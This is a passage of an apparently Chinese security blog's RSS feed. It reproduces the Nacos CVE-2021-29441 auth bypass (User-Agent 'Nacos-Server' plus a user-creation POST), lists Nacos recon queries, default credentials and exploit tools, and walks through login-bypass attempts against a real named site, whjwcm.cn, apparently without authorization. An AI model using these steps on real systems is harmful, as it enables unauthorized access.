&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903130030.png" alt="image.png">&lt;/p></description></item><item><title>【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞</title><link>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/15.webp" alt="Featured image of post 【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞" />&lt;h1 id="1-漏洞概述">1. 漏洞概述&lt;/h1>
&lt;p>2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括&lt;strong>创建新⽤户&lt;/strong>并进⾏登录后操作。&lt;/p>
&lt;h1 id="2-影响版本">2. 影响版本&lt;/h1>
&lt;p>&lt;strong>Nacos &amp;lt;= 2.0.0-ALPHA.1&lt;/strong>&lt;/p>
&lt;h1 id="3-环境搭建">3. 环境搭建&lt;/h1>
&lt;p>&lt;strong>Nacos下载地址(github):&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https: github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Windows搭建：&lt;/p>
&lt;ol>
&lt;li>进入github下载地址后下载版本：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nacos-server-2.0.0-ALPHA.1.zip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>解压出来后进入bin目录：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">D:\TargetDrone\nacos-server-2.0.0-ALPHA.1\nacos-server-2.0.0-ALPHA.1\nacos\bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>输入在当前文件夹下使用打开cmd窗口，输入命令：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\startup.cmd -m standalone
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="4">
&lt;li>然后访问网站：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.31.134:8848/nacos/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.31.134：自己的内网IP地址
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214003.png" alt="image.png">&lt;br>
5. 默认账号密码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> nacos/nacos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>即可。&lt;/p>
&lt;h1 id="4-漏洞复现">4. 漏洞复现&lt;/h1>
&lt;ol>
&lt;li>漏洞路径&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http: your-ip:8848/nacos/v1/auth/users?pageNo=1&amp;amp;pageSize=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214308.png" alt="image.png">&lt;br>
2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http: your-ip:8848/nacos/v1/auth/users
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214433.png" alt="image.png">&lt;br>
PSOT传参：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">username=test1&amp;amp;password=test1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>UA 头：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> Nacos-Server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发送POST请求，返回码200，创建⽤户成功~！&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705124923.png" alt="image.png">&lt;br>
返回Nacos登录界面：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125222.png" alt="image.png">&lt;/p>
&lt;p>使用账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">test1/test1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125331.png" alt="image.png">&lt;br>
关闭环境：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">./shutdown.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="5-漏洞分析">5. 漏洞分析&lt;/h1>
&lt;p>Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。&lt;br>
正因为这样，所以当我们&lt;strong>UA恶意改为Nacos-Server的时候&lt;/strong>，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。&lt;br>
这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析&lt;br>
关键代码在该⽂件下:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">/nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficRevise
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Filter.java
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125530.png" alt="image.png">&lt;br>
TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。&lt;br>
就是很简单的⼀个对于UA的⼀个判断逻辑&lt;br>
这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。&lt;/p>
&lt;h1 id="6-漏洞修复">6. 漏洞修复&lt;/h1>
&lt;p>若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。&lt;/p></description></item><item><title>【Nacos】Nacos红队打点方法</title><link>http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</guid><description>&lt;img src="http://localhost:1313/images/10.webp" alt="Featured image of post 【Nacos】Nacos红队打点方法" />&lt;h1 id="0x00-前置知识">0x00 前置知识&lt;/h1>
&lt;h2 id="1-平台语法">1. 平台语法&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">hunter语法：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">app.name=&amp;#34;Nacos&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fofa语法：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">title=&amp;#34;nacos&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">app=&amp;#34;nacos&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>端口：port=&amp;ldquo;8848&amp;rdquo;&lt;/p>
&lt;h2 id="2-信息收集">2. 信息收集&lt;/h2>
&lt;p>&lt;strong>资产少的情况下：&lt;/strong>&lt;br>
如果没有明显特征，那就通过被动扫描器，如：burp的插件TsojanScan，HAE，logger++等&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Tsojan/TsojanScan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>资产多的情况下：&lt;/strong>&lt;br>
那我们就直接使用指纹识别工具EHole_magic&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://comm.pgpsec.cn/54.html
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以特定⼀些⽬录如nacos、/webroot/decision/login等等，进⾏更加精确的扫描进⾏精准的识别。（但网站收费）&lt;br>
&lt;strong>批量漏洞检测工具：&lt;/strong>&lt;br>
NacosExploit&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/h0ny/NacosExploit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>漏洞检测：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704212254.png" alt="image.png">&lt;/p>
&lt;h2 id="3-漏洞利用点">3. 漏洞利用点&lt;/h2>
&lt;p>Nacos 默认帐户名密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nacos/nacos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x01-工具">0x01 工具&lt;/h1>
&lt;p>反序列化漏洞利⽤⼯具&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/c0olw/NacosRce/releases/tag/v0.5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>哥斯拉nacos后渗透插件&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/pap1rman/postnacos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>综合利⽤,且gui版本&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/charonlight/NacosExploitGUI
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Web攻防】常见Web攻防登录框打法-01</title><link>http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</guid><description>&lt;img src="http://localhost:1313/images/12.webp" alt="Featured image of post 【Web攻防】常见Web攻防登录框打法-01" />&lt;h1 id="开局">开局&lt;/h1>
&lt;p>首先先拿到一个站点：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">whjwcm.cn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">通过fofa，鹰图等等找资产：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">domain=&amp;#34;whjwcm.cn&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">找到一个图文盒子后台登录页面：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://wss.whjwcm.cn
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这时候发现#号：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://wss.whjwcm.cn/manage/#/login?redirect=%2Fplat
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#/login?redirect=%2Fplat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="思路一">思路一&lt;/h1>
&lt;h2 id="0x01-进入后台首先尝试弱口令">0x01 进入后台首先尝试弱口令&lt;/h2>
&lt;p>一般就是最简单的admin&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630103827.png" alt="image.png">&lt;/p>
&lt;h2 id="0x02-看数据包">0x02 看数据包&lt;/h2>
&lt;h3 id="修改error为0">修改error为0&lt;/h3>
&lt;p>通过抓包可以看到返回信息：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;error&amp;#34;:1,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;msg&amp;#34;:&amp;#34;\u7528\u6237\u540d\u6216\u5bc6\u7801\u4e0d\u6b63\u786e&amp;#34;,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;data&amp;#34;:&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">一共三个参数，都可以试一下：
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104121.png" alt="image.png">&lt;/p>
&lt;p>接触该请求，拦截一下相应信息对error进行修改。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104313.png" alt="image.png">&lt;br>
这里可以看到：error和data数据都可以进行修改，然后进行测试。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104356.png" alt="image.png">&lt;br>
发现进入了/admin/user/info，但Cookie认证是一个未知的，这里可以看出已经没什么用了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104448.png" alt="image.png">&lt;/p>
&lt;h3 id="修改error为200">修改error为200&lt;/h3>
&lt;p>这里可以将error修改为200，试一下是否可以绕过。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104643.png" alt="image.png">&lt;br>
发现还是不行，这里思路也没了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104859.png" alt="image.png">&lt;/p>
&lt;h3 id="data进行测试">data进行测试&lt;/h3>
&lt;p>尝试再data参数中添加一下值，看一下是否可以绕过，&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630105024.png" alt="image.png">&lt;br>
发现还是不行:&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630105124.png" alt="image.png">&lt;br>
这时候就可以看一下js文件了，是否有关于这两个参数的代码逻辑问题。&lt;/p>
&lt;h3 id="js文件查找参数">js文件查找参数&lt;/h3>
&lt;p>这里看出从js文件中找到了一个data对应的参数值，也是可以进行尝试的。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630105548.png" alt="image.png">&lt;/p>
&lt;p>但经过测试还是不行，但也是一个思路，后续遇到了可以进行尝试。&lt;/p>
&lt;h3 id="丢弃req数据包">丢弃req数据包&lt;/h3>
&lt;p>通过劫持req的数据包，丢弃掉，有的时候也可以卡进去，但是这里发现，并不行，这时候这种思路也不行了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630110131.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630110246.png" alt="image.png">&lt;/p>
&lt;h3 id="总结">总结&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">这时候再尝试逻辑漏洞就不现实了，现在这种带#的这种漏洞就不多了。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="思路二">思路二&lt;/h1>
&lt;p>如果遇到Cookie:admin-token=未知&lt;br>
如果遇到一个后台登录页面，抓包发现一个error返回参数为1，然后修改参数0，进行尝试发送后，遇到返回数据中有Cookie:admin-token=未知后，我们的思路是：&lt;/p>
&lt;ol>
&lt;li>找小程序的token/Cookie，抓取过去进行尝试&lt;/li>
&lt;li>找其他系统的弱口令进行尝试修改。&lt;/li>
&lt;/ol></description></item><item><title>【内网攻防】Windows工作组信息收集</title><link>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description>&lt;img src="http://localhost:1313/images/13.webp" alt="Featured image of post 【内网攻防】Windows工作组信息收集" />&lt;h1 id="0x00-前置">0x00 前置&lt;/h1>
&lt;p>当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：&lt;br>
我是谁？&amp;ndash;主机身份与特权边界确认。&lt;br>
这是哪？&amp;ndash;对目前机器处网络环境的拓扑结构进行分析和判断。&lt;br>
我在哪？&amp;ndash;对目前机器所处伪造区域的判断。&lt;br>
谁在哪？&amp;ndash;对比钱机器反防御技术识别网络中的安全监控节点。&lt;/p>
&lt;h1 id="0x01-要收集的信息">0x01 要收集的信息&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
